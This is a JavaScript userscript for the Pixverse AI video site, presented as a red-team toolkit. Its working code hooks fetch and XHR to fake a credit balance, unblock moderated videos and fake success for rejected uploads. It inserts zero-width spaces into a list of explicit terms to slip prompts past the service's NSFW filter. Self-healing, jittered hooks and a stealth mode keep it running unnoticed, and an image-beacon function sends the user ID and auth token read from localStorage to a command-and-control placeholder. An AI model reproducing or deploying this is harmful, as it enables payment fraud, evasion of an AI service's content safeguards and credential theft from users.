// ==UserScript==
// @name        4ndr0tools-Pixverse++
// @namespace   https://github.com/4ndr0666/userscripts
// @author      4ndr0666
// @version     2.3.2 
// @description Red-team lab toolset blue team engagements focusing on exploits: credits patch, video/status unlock, robust download, prompt NSFW bypass, API override, anti-blockers. Includes self-healing hooks and covert data exfiltration.
// @downloadURL https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++.user.js
// @updateURL   https://github.com/4ndr0666/userscripts/raw/refs/heads/main/4ndr0tools%20-%20Pixverse++.user.js
// @icon        https://raw.githubusercontent.com/4ndr0666/4ndr0site/refs/heads/main/static/cyanglassarch.png
// @match       https://app.pixverse.ai/*
// @run-at      document-start
// @grant       none
// @license     MIT
// ==/UserScript==

(() => {
  "use strict";

  // Prevent multiple initializations of the script if it somehow gets loaded more than once.
  if (window._pixverseToolkitInitialized) {
    return;
  }
  window._pixverseToolkitInitialized = true;

  //────── CONSTANTS & CONFIG ──────//

  // Set DEBUG_MODE to true during development/testing for console logs and toast notifications.
  // Set to false for stealthy red team deployment.
  const DEBUG_MODE = false; // <<< IMPORTANT FOR TESTING/DEBUGGING: Set to 'true' >>>

  const DEBUG_PREFIX = '[Pixverse++]'; // Used only if DEBUG_MODE is true
  const MAX_ATTEMPTS = 30; // Max attempts for DOM element observation in setupWatermarkButton
  let savedMediaPath = null; // Stores the path of a successfully uploaded media for faking future uploads
  let isInitialized  = false; // Flag to ensure core overrides are run only once
  let btnAttached    = false; // Flag to track if the custom download button handler has been attached

  // --- C2 Configuration for Data Exfiltration ---
  // IMPORTANT: Replace 'https://your-c2.com' with your actual controlled server domain for live use.
  // Your server should be configured to receive GET requests at the /exfil path and log the parameters.
  const C2_SERVER_DOMAIN = 'https://your-c2.com';

  // --- References to your custom overridden functions for self-healing ---
  // These will store the function pointers to your overridden XMLHttpRequest.prototype.open
  // and window.fetch so you can check if they've been replaced by other scripts.
  let myCustomXhrOpen = null;
  let myCustomFetch = null;

  // List of words to obfuscate in prompts to bypass NSFW filters.
  const TRIGGER_WORDS = [
	  "anal","asshole","anus","areola","areolas","blowjob","boobs","bounce","bouncing","breast","breasts",
	  "bukake","buttcheeks","butt","cheeks","climax","clit","cleavage","cock","corridas","crotch","cum","cums","culo","cunt",
	  "deep","deepthroat","ddick","dick","esperma","fat ass","fellatio","fingering","fuck","fucking","fucked","horny","lick","masturbate",
	  "masterbating","missionary","member","meco","moan","moaning","nipple","nsfw","oral","orgasm","penis","phallus","pleasure",
	  "pussy","rump","semen","slut","slutty","splooge","squeezing","squeeze","suck","sucking","swallow","throat","throating",
	  "tits","tit","titty","titfuck","titties","tittydrop","tittyfuck","titfuck","vagina","wiener","whore","creampie","cumshot","cunnilingus",
	  "doggystyle","ejaculate","ejaculation","handjob","jerk off","labia","nude","orgy","porn","prolapse",
	  "rectum","rimjob","sesual","stripper","submissive","teabag","threesome","vibrator","voyeur","whore"
  ];

  /**
   * Helper function to escape special characters in a string for use in a RegExp constructor.
   * @param {string} str - The string to escape.
   * @returns {string} - The escaped string.
   */
  function escapeRegExp(str) {
    // Correctly escapes all special regex characters. $& inserts the matched substring.
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  // Pre-compile a single regex for efficient NSFW prompt obfuscation.
  // This is a significant performance improvement over creating a new regex for each word
  // every time obfuscatePrompt is called.
  const NSFW_PROMPT_REGEX = new RegExp(
    `\\b(?:${TRIGGER_WORDS.map(escapeRegExp).join('|')})\\b`, // Combines all words with OR (?:...) for non-capturing group
    "gi" // Global and case-insensitive flags
  );

  // API endpoints to intercept and modify. Regular expressions are used for flexible matching.
  const API_ENDPOINTS = {
    credits:        /\/user\/credits(?:\?|$)/, // Matches /user/credits or /user/credits?param=value
    videoList:      /\/video\/list\/personal/,
    batchUpload:    /\/media\/batch_upload_media/,
    singleUpload:   /\/media\/upload/,
    creativePrompt: /\/creative_platform\/video\// // Endpoint for submitting video generation prompts
  };

  /**
   * Checks if a given URL matches a predefined API endpoint using its regex.
   * @param {string} url - The URL to test.
   * @param {string} key - The key of the API endpoint in API_ENDPOINTS (e.g., "credits", "videoList").
   * @returns {boolean} - True if the URL matches the endpoint, false otherwise.
   */
  function matchesEndpoint(url, key) {
    return API_ENDPOINTS[key]?.test(url);
  }

  /**
   * Logs messages to the console with a consistent prefix for easy filtering.
   * Only logs if DEBUG_MODE is true.
   * @param {...any} args - Arguments to log.
   */
  function log(...args) {
    if (DEBUG_MODE) {
      console.log(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Logs error messages to the console with a consistent prefix.
   * Only logs if DEBUG_MODE is true.
   * In a high-stealth scenario, even these might be removed or sent to a hidden location.
   * @param {...any} args - Arguments to log.
   */
  function error(...args) {
    if (DEBUG_MODE) {
      console.error(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Exfiltrates data covertly using an image beacon.
   * Only attempts if C2_SERVER_DOMAIN is configured.
   * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
   * @param {string} dataPayload - The actual data to exfiltrate.
   */
  function exfiltrateData(dataType, dataPayload) {
    // Prevent exfiltration if C2_SERVER_DOMAIN is not properly set (or is the placeholder).
    if (!C2_SERVER_DOMAIN || C2_SERVER_DOMAIN === 'https://your-c2.com') {
      error("C2_SERVER_DOMAIN not configured or set to placeholder. Data exfiltration skipped.");
      return;
    }
    try {
      const beacon = new Image();
      // Construct the URL: your C2 server, a path to identify the data type, and the encoded payload.
      // The timestamp helps prevent caching and adds a bit of uniqueness.
      beacon.src = `${C2_SERVER_DOMAIN}/exfil?type=${encodeURIComponent(dataType)}&data=${encodeURIComponent(dataPayload)}&_t=${Date.now()}`;
      // No need to append to DOM, just setting src triggers the request.
      log(`Data exfiltration initiated for type: ${dataType}`);
    } catch (e) {
      error(`Failed to exfiltrate data of type ${dataType}:`, e);
    }
  }

  /**
   * Parses a request body (either FormData or a JSON string) into a JavaScript object.
   * @param {FormData|string} body - The request body.
   * @returns {object|null} - The parsed object, or null if parsing fails or body type is unsupported.
   */
  function parseBody(body) {
    if (body instanceof FormData) {
      try {
        return Object.fromEntries(body);
      } catch (e) {
        error("Failed to parse FormData:", e);
        return null;
      }
    }
    if (typeof body === "string") {
      try {
        return JSON.parse(body);
      } catch (e) {
        error("Failed to parse JSON string:", e);
        return null;
      }
    }
    return null; // Return null for unsupported body types
  }

  /**
   * Obfuscates trigger words in a prompt by inserting zero-width spaces (`\u200B`).
   * This technique can bypass simple string-matching NSFW filters by breaking up the words
   * without changing their visual appearance.
   * @param {string} prompt - The original prompt string.
   * @returns {string} - The obfuscated prompt string.
   */
  function obfuscatePrompt(prompt) {
    // Use the pre-compiled regex for efficient replacement.
    return prompt.replace(NSFW_PROMPT_REGEX, m => m.split('').join('\u200B'));
  }

  /**
   * Extracts a media path from an API request body, specifically for upload endpoints.
   * This path is then used to fake successful uploads if the actual upload fails.
   * @param {object} data - The request data object.
   * @param {string} url - The URL of the request, used to determine the endpoint type.
   * @returns {string|null} - The extracted media path (e.g., "path/to/video.mp4"), or null if not found.
   */
  function extractMediaPath(data, url) {
    if (!data || typeof data !== "object") {
      return null;
    }
    if (matchesEndpoint(url, "batchUpload") && Array.isArray(data.images)) {
      return data.images[0]?.path || null;
    }
    if (matchesEndpoint(url, "singleUpload")) {
      if (typeof data.path === "string") return data.path;
      if (typeof data.media_path === "string") return data.media_path;
      // Fallback: look for any string property that looks like an MP4 path
      for (const k in data) {
        if (typeof data[k] === "string" && /\.mp4$/i.test(data[k])) {
          return data[k];
        }
      }
    }
    return null;
  }

  /**
   * Modifies the user credits response to always show 100 credits.
   * @param {object} data - The original response data.
   * @returns {object|null} - The modified data, or null if the structure doesn't match.
   */
  function tryModifyCredits(data) {
    if (data?.Resp?.credits !== undefined) {
      const clone = structuredClone(data); // Create a deep clone to avoid side effects on original response
      clone.Resp.credits = 100;
      log('Credits restored to 100');
      // Example: Exfiltrate a user ID if it's available in the credits response
      if (data.Resp.user_id) { // Assuming 'user_id' might be a key in the Resp object
          exfiltrateData("user_id_from_credits", data.Resp.user_id.toString());
      }
      return clone;
    }
    return null;
  }

  /**
   * Modifies the video list response to unlock video status (e.g., from blocked to ready)
   * and bypass NSFW placeholder images by pointing directly to the video path.
   * @param {object} data - The original response data.
   * @returns {object} - The modified data. Returns original data if structure is unexpected.
   */
  function modifyVideoList(data) {
    if (!data?.Resp?.data) {
      return data; // Return original data if the expected structure is missing
    }
    // List of strings commonly found in NSFW placeholder URLs.
    const NSFW_PLACEHOLDERS = [
      "/nsfw", "/forbidden", "placeholder", "blocked", "ban", "pixverse-ban"
    ];

    /**
     * Helper to check if a URL contains any known NSFW placeholder strings.
     * @param {string} url - The URL to check.
     * @returns {boolean} - True if the URL is likely an NSFW placeholder, false otherwise.
     */
    function isNSFW(url) {
      if (!url) return false;
      return NSFW_PLACEHOLDERS.some(p => url.includes(p));
    }

    const clone = structuredClone(data); // Create a deep clone to safely modify the data
    clone.Resp.data = clone.Resp.data.map(item => {
      // Change video_status 7 (often indicates blocked/pending) to 1 (ready/available)
      if (item.video_status === 7) {
        item.video_status = 1;
      }

      let preview =
        (item.extended === 1 && item.customer_paths?.customer_video_last_frame_url) ||
        item.customer_paths?.customer_img_url ||
        '';

      // If the current preview URL is not an NSFW placeholder and is valid, use it.
      // Otherwise, try to construct a direct URL to the video itself for the preview.
      if (!isNSFW(preview) && preview) {
        item.first_frame = preview;
      } else if (item.video_path) {
        // Append #t=0.2 to load the video at 0.2 seconds, often used for a quick preview frame.
        item.first_frame = `https://media.pixverse.ai/${item.video_path}#t=0.2`;
      } else {
        // Fallback to the original preview if no video_path is available.
        item.first_frame = preview;
      }
      // Ensure the main video URL points directly to the media server if video_path exists.
      item.url = item.video_path ? `https://media.pixverse.ai/${item.video_path}` : '';
      return item;
    });
    return clone;
  }

  /**
   * Central function to apply appropriate response modifications based on the request URL.
   * This is where the core API bypass logic resides for various endpoints.
   * @param {object} data - The original response data.
   * @param {string} url - The URL of the request.
   * @returns {object|null} - The modified data, or null if no modification was applied.
   */
  function modifyResponse(data, url) {
    if (!data || typeof data !== "object") return null;

    // Credit modification (always attempt if endpoint matches)
    if (matchesEndpoint(url, "credits")) {
      const modified = tryModifyCredits(data);
      if (modified) return modified;
    }

    // Video list modification (always attempt if endpoint matches)
    if (matchesEndpoint(url, "videoList")) {
      // modifyVideoList always returns data or a clone, so it's always a "modification" for this branch.
      return modifyVideoList(data);
    }

    // Upload modification: apply a generic success fake if any error occurs AND we have a saved path.
    // This is crucial for bypassing NSFW upload rejections.
    if (matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) {
      // Only proceed if the server returned an error (ErrCode is not 0) and we have a media path
      // captured from the request (meaning a file was actually attempted to be uploaded).
      if (data?.ErrCode !== 0 && savedMediaPath) {
        log(`Attempting to fake upload success for ${url}. Original ErrCode: ${data.ErrCode}. Saved Path: ${savedMediaPath}`);
        // Construct the faked success response based on the endpoint type.
        if (matchesEndpoint(url, "batchUpload")) {
          const id = Date.now(); // Generate a unique ID for the faked upload
          const name = savedMediaPath.split('/').pop() || 'uploaded_media'; // Extract filename from path
          return {
            ErrCode: 0, // Indicate success
            ErrMsg: "success",
            Resp: {
              result: [{
                id, category: 0, err_msg: "",
                name, path: savedMediaPath, size: 0, // Size can be 0 as it's a faked response
                url: `https://media.pixverse.ai/${savedMediaPath}`
              }]
            }
          };
        } else { // singleUpload
          return {
            ErrCode: 0, ErrMsg: "success", Resp: {
              path: savedMediaPath,
              url: `https://media.pixverse.ai/${savedMediaPath}`,
              name: savedMediaPath.split('/').pop() || 'uploaded_media',
              type: 1
            }
          };
        }
      } else if (DEBUG_MODE && data?.ErrCode !== undefined && data.ErrCode !== 0) {
        // Log if an error occurred for an upload, but we couldn't fake it (e.g., no savedMediaPath),
        // which helps in debugging new error types or missing paths. Only log in debug mode.
        log(`Upload error for ${url}, but faking not applied. ErrCode: ${data.ErrCode}, savedMediaPath: ${savedMediaPath}`);
      }
    }
    return null; // No applicable modification found.
  }

  //────── FILENAME & SANITIZE HELPERS ──────//

  /**
   * Sanitizes a string for use as a filename.
   * Removes invalid filename characters, leading/trailing dots/spaces, and truncates.
   * @param {string} str - The input string.
   * @returns {string} - The sanitized filename string.
   */
  function sanitize(str) {
    // Remove invalid filename characters: \ / : * ? " < > |
    // Also remove control characters (\u0000-\u001F)
    // Replace leading/trailing dots or spaces, and truncate.
    return String(str)
      .replace(/[\u0000-\u001F\\/:*?"<>|]+/g, "_") // Replace invalid characters with underscore
      .replace(/^\.+/, '') // Remove leading dots
      .replace(/\.+$/, '') // Remove trailing dots
      .replace(/^\s+|\s+$/g, '') // Trim leading/trailing whitespace
      .slice(0, 120); // Safety truncation to prevent excessively long filenames
  }

  /**
   * Generates a suitable filename for a video element.
   * It prioritizes extracting a title from the DOM, then falls back to a URL-based guess.
   * @param {HTMLVideoElement} videoEl - The video element from which to derive the filename.
   * @param {string} fallback - A default filename to use if no better name can be determined.
   * @returns {string} - The generated and sanitized filename.
   */
  function getFilename(videoEl, fallback = "video.mp4") {
    let src = (videoEl?.currentSrc || videoEl?.src || fallback);
    let guess = (src.split("/").pop() || fallback).split("?")[0]; // Get filename from URL, remove query params

    let title = "";
    try {
      // Attempt to find a title from common parent containers of the video player
      let container = videoEl.closest(".component-video,.pv-video-detail-page");
      title = container?.querySelector("h2, .title, .pv-title")?.textContent?.trim() || "";
    } catch (e) {
      error("Error extracting title for filename:", e);
    }

    // If a meaningful title is found, use it and append .mp4. Otherwise, sanitize the URL-guessed filename.
    if (title) {
      return sanitize(title) + ".mp4";
    }
    return sanitize(guess);
  }

  /**
   * Overrides the native XMLHttpRequest.prototype.open and .send methods
   * to intercept and modify request bodies and responses.
   */
  function overrideXHR() {
    const oOpen = XMLHttpRequest.prototype.open;
    const oSend = XMLHttpRequest.prototype.send;

    // Store URL and method for later use in the 'send' method and 'load' event.
    XMLHttpRequest.prototype.open = function(m, u) {
      this._url = u;
      this._method = m;
      return oOpen.apply(this, arguments);
    };
    // Store reference to your custom open function for self-healing
    myCustomXhrOpen = XMLHttpRequest.prototype.open;

    XMLHttpRequest.prototype.send = function(body) {
      const url = this._url || "";
      const method = (this._method || "GET").toUpperCase();

      // Intercept creative prompt requests (POST to creative_platform/video)
      // to obfuscate NSFW words in the prompt body.
      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
        try {
          let obj = (typeof body === "string") ? JSON.parse(body) : body;
          if (obj.prompt) {
            obj.prompt = obfuscatePrompt(obj.prompt);
            body = JSON.stringify(obj); // Re-serialize the modified body
          }
        } catch (e) {
          error("Error obfuscating XHR prompt:", e);
        }
      }

      // Intercept media upload requests (batch_upload_media or upload)
      // to extract and save the media path from the request body.
      // This path is used later to fake successful responses if the upload is rejected.
      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
        const data = parseBody(body);
        const p = extractMediaPath(data, url);
        if (p) savedMediaPath = p; // Store the path for faking future upload successes
      }

      // Add an event listener to the XHR object to modify the response once it loads.
      this.addEventListener("load", () => {
        if (this.status >= 200 && this.status < 300) { // Only process successful HTTP responses (network-wise)
          let resp;
          try {
            // Attempt to parse the response as JSON, handling different response types.
            resp = this.responseType === "json" ? this.response : JSON.parse(this.responseText || "{}");
          } catch (e) {
            error("Error parsing XHR response:", e);
            resp = null;
          }

          if (resp !== null) {
            const modifiedResponse = modifyResponse(resp, url);
            if (modifiedResponse) {
              // If the response was modified, redefine the XHR's response properties
              // to return the modified data instead of the original.
              Object.defineProperties(this, {
                response: { value: modifiedResponse, writable: false, configurable: true },
                responseText: { value: JSON.stringify(modifiedResponse), writable: false, configurable: true }
              });
              log('XHR response modified for:', url);
            }
          }
        }
      }, { once: true }); // Use { once: true } to automatically remove the listener after it fires

      return oSend.apply(this, arguments); // Call the original send method with potentially modified body
    };
    log('XHR override initialized');
  }

  /**
   * Overrides the native window.fetch method to intercept and modify requests and responses.
   */
  function overrideFetch() {
    const origFetch = window.fetch; // Store the original fetch function

    window.fetch = async function(...args) {
      const url = typeof args[0] === "string" ? args[0] : args[0]?.url || "";
      let init = args[1]; // Request options (method, headers, body, etc.)
      const method = (init?.method || "GET").toUpperCase();
      let body = init?.body;

      // Intercept creative prompt requests to obfuscate NSFW words in the prompt body.
      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
        try {
          let obj = (typeof body === "string") ? JSON.parse(body) : body;
          if (obj.prompt) {
            obj.prompt = obfuscatePrompt(obj.prompt);
            // Create a new init object with the modified body to pass to the original fetch.
            init = { ...init, body: JSON.stringify(obj) };
            args[1] = init; // Update the arguments array for the original fetch call
            body = init.body; // Update local body variable for subsequent checks
          }
        } catch (e) {
          error("Error obfuscating Fetch prompt:", e);
        }
      }

      // Intercept media upload requests to extract and save the media path.
      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
        const data = parseBody(body);
        const p = extractMediaPath(data, url);
        if (p) savedMediaPath = p;
      }

      try {
        const res = await origFetch.apply(this, args); // Call the original fetch with potentially modified arguments
        const contentType = res.headers.get("content-type") || "";

        // Only attempt to modify responses that are JSON.
        if (contentType.includes("application/json")) {
          const clone = res.clone(); // Clone the response so its body can be read without consuming the original.
          let json;
          try { json = await clone.json(); } catch (e) {
            error("Error parsing Fetch response JSON:", e);
            json = null;
          }

          if (json !== null) {
            const modifiedResponse = modifyResponse(json, url);
            if (modifiedResponse) {
              const modifiedBodyString = JSON.stringify(modifiedResponse);
              const headers = new Headers(res.headers);
              headers.set("Content-Type", "application/json"); // Ensure the content type remains correct

              log('Fetch response modified for:', url);
              // Return a new Response object with the modified body, but retain original status and headers.
              return new Response(modifiedBodyString, {
                status: res.status,
                statusText: res.statusText,
                headers: headers
              });
            }
          }
        }
        return res; // Return the original response if no modification was applied or it wasn't JSON.
      } catch (err) {
        error("Fetch error for", url, err);
        throw err; // Re-throw the error to propagate it.
      }
    };
    // Store reference to your custom fetch function for self-healing
    myCustomFetch = window.fetch;
    log('Fetch override initialized');
  }

  /**
   * Simple throttle function to limit how often a function can be called.
   * Useful for preventing excessive calls to DOM manipulation functions during rapid changes.
   * Introduces a small random jitter to the delay for stealth.
   * @param {Function} fn - The function to throttle.
   * @param {number} baseDelay - The minimum base delay in milliseconds between function invocations.
   * @param {number} [jitter=100] - Max random milliseconds to add to the baseDelay.
   * @returns {Function} - The throttled function.
   */
  function throttle(fn, baseDelay, jitter = 100) {
    let last = 0, timeoutId;
    return function(...args) {
      const now = Date.now();
      const currentDelay = baseDelay + Math.random() * jitter; // Add random jitter
      // If the time since the last execution is less than the delay,
      // clear any pending timeout and set a new one.
      if (now - last < currentDelay) {
        clearTimeout(timeoutId);
        timeoutId = setTimeout(() => {
          last = Date.now();
          fn.apply(this, args);
        }, currentDelay - (now - last));
      } else {
        // If enough time has passed, execute immediately.
        last = now;
        fn.apply(this, args);
      }
    };
  }

  /**
   * Sets up a robust download handler for the existing "Download" button on the page.
   * It uses a MutationObserver to detect when the button becomes available in the DOM,
   * and throttles attempts to attach the handler with randomized delays.
   */
  function setupWatermarkButton() {
    if (btnAttached) return; // Prevent attaching the handler multiple times.
    let attemptCount = 0;

    // Throttle the button attachment attempts to avoid excessive DOM queries during rapid mutations.
    // Base delay 300ms, jitter up to 100ms (so delay is between 300-400ms)
    const throttledTryAttach = throttle(tryAttachButton, 300, 100);

    function tryAttachButton() {
      // Look for the main content area or fallback to body if not found.
      let mainContent = document.querySelector('#main-content,[role="main"]') || document.body;
      // Find all button elements within the main content.
      let allBtns = mainContent.querySelectorAll("button");

      for (let btn of allBtns) {
        // Identify the "Download" button by looking for a child div with "Download" text.
        let labelDiv = Array.from(btn.querySelectorAll("div")).find(d => d.textContent && d.textContent.trim() === "Download");
        // If a "Download" button is found and our handler hasn't been injected yet.
        if (labelDiv && !btn.dataset.injected) {
          // Attach a click event listener. Using the capture phase (true) ensures our handler runs first.
          btn.addEventListener("click", e => {
            e.stopPropagation(); // Prevent the original button's click handler from executing.
            const videoEl = document.querySelector(".component-video>video,video"); // Find the main video element on the page.
            if (videoEl?.src) {
              const url = videoEl.currentSrc || videoEl.src;
              const filename = getFilename(videoEl); // Get a sanitized filename for the download.
              const a = document.createElement("a"); // Create a temporary anchor element for download.
              a.href = url;
              a.download = filename; // Set the download attribute to force download with specified filename.
              document.body.appendChild(a);
              a.click(); // Programmatically click the hidden link to trigger download.
              a.remove(); // Remove the temporary link from the DOM.
              showToast("Download started!"); // This toast is also conditional on DEBUG_MODE
            } else {
              showToast("No video found to download."); // This toast is also conditional on DEBUG_MODE
            }
          }, true); // The 'true' argument means the listener is in the capture phase.
          btn.dataset.injected = "1"; // Mark the button to prevent re-injection.
          btnAttached = true; // Set flag indicating at least one button handler is attached.
          log('[Pixverse++] Canonical Download button injected');
          // No break here, in case multiple "Download" buttons need their handlers overridden.
        }
      }

      // If no button was attached in this attempt and we haven't exceeded max attempts, try again after a delay.
      // Add a small random jitter to the retry delay (350ms base + up to 50ms jitter)
      if (!btnAttached && attemptCount < MAX_ATTEMPTS) {
        attemptCount++;
        setTimeout(throttledTryAttach, 350 + Math.random() * 50); // Schedule the next attempt using the throttled function.
      }
    }

    // Observe DOM changes to dynamically attach the button handler if the element appears later.
    let observerTarget = document.querySelector('#main-content,[role="main"]') || document.body;
    const observer = new MutationObserver(throttledTryAttach);
    observer.observe(observerTarget, { childList: true, subtree: true }); // Observe for added/removed nodes anywhere in the subtree.

    // Initial attempt to attach the button handler immediately.
    tryAttachButton();
  }

  /**
   * Sets up self-healing hooks for network request overrides (XHR and Fetch).
   * Periodically checks if the overrides are still active and reapplies them if they've been replaced.
   */
  function setupSelfHealingHooks() {
    // Check every 5 seconds, plus a random jitter up to 1 second, for stealth.
    setInterval(() => {
      // Check if our XHR hook is still in place
      // Compare current XMLHttpRequest.prototype.open with our stored custom reference
      if (myCustomXhrOpen && XMLHttpRequest.prototype.open !== myCustomXhrOpen) {
        log('XHR hook detected as overwritten, re-applying...');
        overrideXHR(); // Reapply the hook
      }
      // Check if our Fetch hook is still in place
      // Compare current window.fetch with our stored custom reference
      if (myCustomFetch && window.fetch !== myCustomFetch) {
        log('Fetch hook detected as overwritten, re-applying...');
        overrideFetch(); // Reapply the hook
      }
    }, 5000 + Math.random() * 1000); // Add jitter to self-healing interval too
    log('Self-healing hooks initialized');
  }


  /**
   * Displays a transient toast notification at the bottom center of the screen.
   * Only displays if DEBUG_MODE is true.
   * @param {string} msg - The message to display in the toast.
   * @param {number} [duration=3500] - Duration in milliseconds before the toast starts to fade out.
   */
  function showToast(msg, duration = 3500) {
    if (!DEBUG_MODE) return; // Do not show toast in stealth mode.

    // Remove any existing toasts to ensure only one is visible at a time.
    document.querySelectorAll(".pv-toast").forEach(e => e.remove());

    const el = document.createElement("div");
    el.className = "pv-toast";
    el.textContent = msg;

    // Apply inline styles for the toast's appearance and positioning.
    Object.assign(el.style, {
      position: "fixed",
      bottom: "22px",
      left: "50%",
      transform: "translateX(-50%)",
      background: "rgba(20,40,48,0.94)",
      color: "#15FFFF",
      padding: "8px 20px",
      borderRadius: "6px",
      font: "15px/1.2 sans-serif",
      zIndex: "299999", // High z-index to ensure it's on top of other content.
      opacity: "0",
      transition: "opacity .25s ease-in-out", // Smooth fade in/out transition.
      pointerEvents: "none" // Allows clicks to pass through the toast to elements beneath it.
    });

    document.body.appendChild(el);

    // Trigger fade-in animation using requestAnimationFrame for smooth rendering.
    requestAnimationFrame(() => el.style.opacity = "1");

    // Schedule fade-out and removal after the specified duration.
    setTimeout(() => {
      el.style.opacity = "0";
      // Remove the element from DOM after the fade-out transition completes.
      el.addEventListener("transitionend", () => el.remove(), { once: true });
    }, duration);
  }

  /**
   * Overrides context menu blocking mechanisms on the page.
   * It intercepts `addEventListener` calls to block `contextmenu` events
   * and uses a `MutationObserver` to remove `oncontextmenu` attributes from elements.
   */
  function overrideContextMenuBlockers() {
    // Override EventTarget.prototype.addEventListener to prevent new 'contextmenu' listeners from being added.
    const originalAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, handler, options) {
      if (type === "contextmenu") {
        return; // Block the addition of contextmenu event listeners.
      }
      return originalAddEventListener.apply(this, arguments);
    };

    // Use a MutationObserver to remove 'oncontextmenu' attributes from elements
    // that are dynamically added to the DOM.
    new MutationObserver(mutations => {
      mutations.forEach(mutation => mutation.addedNodes.forEach(node => {
        if (node.nodeType === 1) { // Check if the added node is an Element.
          if (node.hasAttribute("oncontextmenu")) {
            node.removeAttribute("oncontextmenu");
          }
          // Also check all descendants of the added node for 'oncontextmenu' attributes.
          node.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
        }
      }));
    }).observe(document.documentElement, { childList: true, subtree: true }); // Observe the entire document for added nodes.

    // Remove 'oncontextmenu' attributes from any elements already present in the DOM on initial load.
    document.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
    log('Anti-contextmenu enabled');
  }

  /**
   * Initializes the toolkit by applying all necessary overrides and setting up features.
   * Ensures that initialization happens only once.
   */
  function initialize() {
    if (isInitialized) {
      return; // Prevent re-initialization.
    }
    try {
      overrideContextMenuBlockers();
      overrideXHR();
      overrideFetch();
      setupWatermarkButton();
      setupSelfHealingHooks(); // <<< NEW: Enable self-healing for network hooks

      // Example: Read from local storage and exfiltrate data on initialization
      try {
        const userId = localStorage.getItem('pixverse_user_id'); // Placeholder key, adapt as needed
        if (userId) {
          log('Found potential user ID in local storage:', userId);
          exfiltrateData("local_storage_user_id", userId);
        }
        const token = localStorage.getItem('pixverse_auth_token'); // Placeholder key, adapt as needed
        if (token) {
          log('Found potential auth token in local storage:', token);
          exfiltrateData("local_storage_auth_token", token);
        }
      } catch (e) {
        error("Error accessing local storage during initialization:", e);
      }

      isInitialized = true;
      log('Pixverse++ initialized'); // Will only log in DEBUG_MODE
      showToast('Pixverse++ Toolkit loaded ✓'); // Will only show in DEBUG_MODE
    } catch (e) {
      error('Initialization failed', e); // Will only log in DEBUG_MODE
      showToast('Pixverse++ init error'); // Will only show in DEBUG_MODE
    }
  }

  // Determine when to initialize the script.
  // @run-at document-start ensures the script runs as early as possible.
  // If the document is still loading, wait for DOMContentLoaded to ensure basic DOM is ready.
  // Otherwise, if the document is already interactive/complete, initialize immediately.
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize, { once: true });
  } else {
    initialize();
  }

  // Immediately-invoked function to inject minimal CSS for the toast notification.
  // This ensures the CSS is present as soon as possible, BUT ONLY IF DEBUG_MODE is true.
  (function() {
    if (!DEBUG_MODE) return; // <<< NEW: Do not inject toast CSS in stealth mode.
    if (document.getElementById("pv-toast-css")) {
      return; // Prevent re-injection of the CSS if already present.
    }
    const styleElement = document.createElement("style");
    styleElement.id = "pv-toast-css";
    styleElement.textContent = `.pv-toast{box-sizing:border-box;user-select:none;pointer-events:none;}`;
    document.head.appendChild(styleElement);
  })();

})();
